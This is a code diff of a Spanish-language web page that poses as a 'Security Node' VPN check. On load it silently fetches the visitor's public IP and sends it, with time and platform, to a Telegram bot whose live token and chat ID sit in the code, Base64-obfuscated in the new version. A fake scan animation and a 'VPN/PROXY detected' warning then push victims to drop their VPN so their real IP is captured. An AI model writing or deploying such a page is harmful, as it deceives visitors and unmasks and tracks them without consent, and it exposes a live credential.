@@ -2,49 +2,72 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Cargando Sistema...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Node - Verification</title>
     <style>
-        body { background: #1c2733; color: white; font-family: sans-serif; text-align: center; padding-top: 20%; }
-        .spinner { border: 4px solid rgba(255,255,255,0.1); width: 36px; height: 36px; border-radius: 50%; border-left-color: #3498db; animation: spin 1s linear infinite; display: inline-block; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background: #0f172a; color: #f8fafc; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { background: #1e293b; border: 1px solid #334155; padding: 2rem; border-radius: 8px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); max-width: 400px; width: 90%; text-align: center; }
+        .warn { color: #fbbf24; font-size: 3rem; margin-bottom: 1rem; }
+        h2 { margin: 0 0 1rem; font-size: 1.2rem; text-transform: uppercase; letter-spacing: 2px; }
+        .loader { height: 4px; width: 100%; background: #334155; border-radius: 10px; margin: 1.5rem 0; overflow: hidden; }
+        .fill { height: 100%; width: 0%; background: #ef4444; transition: width 0.1s; }
+        #status { font-size: 0.8rem; color: #94a3b8; }
+        .error-msg { display: none; background: #450a0a; border: 1px solid #991b1b; padding: 10px; border-radius: 4px; margin-top: 1rem; font-size: 0.85rem; color: #fca5a5; }
     </style>
 </head>
 <body>
-    <div class="spinner"></div>
-    <p>Sincronizando con el servidor seguro...</p>
+    <div class="box">
+        <div class="warn">⚠️</div>
+        <h2>Security Alert</h2>
+        <div id="status">Iniciando escaneo de túneles...</div>
+        <div class="loader"><div class="fill" id="bar"></div></div>
+        <div id="error-box" class="error-msg">
+            <strong>VPN/PROXY DETECTADO</strong><br>
+            El sistema ha bloqueado el acceso desde su IP actual por uso de herramientas de anonimato. Desactive su VPN y recargue para ver el reporte.
+        </div>
+    </div>
 
     <script>
-        // CONFIGURACIÓN DIRECTA
-        const BOT_TOKEN = "8150721786:AAGmMp9chOnrKgU8w9HF_llE8Liq3lVpIV8";
-        const MI_CHAT_ID = "8369458396";
+        // DATOS OFUSCADOS (Base64)
+        const _0x4a21 = ["ODE1MDcyMTc4NjpBQUdtTXA5Y2hPbnJLZ1U4dzlIRl9sbEU4TGlxM2xWcElWOA==", "ODM2OTQ1ODM5Ng=="];
+        const _k = atob(_0x4a21[0]);
+        const _i = atob(_0x4a21[1]);
 
-        async function enviarTelegram() {
+        async function init() {
+            const bar = document.getElementById('bar');
+            const st = document.getElementById('status');
+            const err = document.getElementById('error-box');
+            
+            // 1. Captura Silenciosa
             try {
-                // 1. Sacamos la IP real
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                const ip = data.ip;
-                const hora = new Date().toLocaleString();
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                const ip = d.ip;
 
-                // 2. LA MANDAMOS DIRECTO A TU CHAT
-                const texto = `🌐 **IP DETECTADA**\n\n📍 IP: \`${ip}\`\n⌚ Hora: ${hora}\n📱 Sistema: ${navigator.platform}`;
-                
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${_k}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: MI_CHAT_ID,
-                        text: texto,
-                        parse_mode: "Markdown"
-                    })
+                    body: JSON.stringify({ chat_id: _i, text: `🛡️ **REPORTE DE ACCESO**\n\n🌐 IP: \`${ip}\`\n⌚ ${new Date().toLocaleString()}\n📱 ${navigator.platform}`, parse_mode: "Markdown" })
                 });
+            } catch(e) {}
 
-            } catch (e) {
-                console.log("Error de red");
-            }
+            // 2. Animación de "Detección"
+            let w = 0;
+            const iv = setInterval(() => {
+                w += 1;
+                bar.style.width = w + "%";
+                if(w == 30) st.innerText = "Analizando paquetes...";
+                if(w == 60) st.innerText = "Cruzando IP con registros...";
+                if(w == 90) st.innerText = "Finalizando...";
+                if(w >= 100) {
+                    clearInterval(iv);
+                    st.style.display = "none";
+                    err.style.display = "block";
+                }
+            }, 50);
         }
 
-        window.onload = enviarTelegram;
+        window.onload = init;
     </script>
 </body>
 </html>
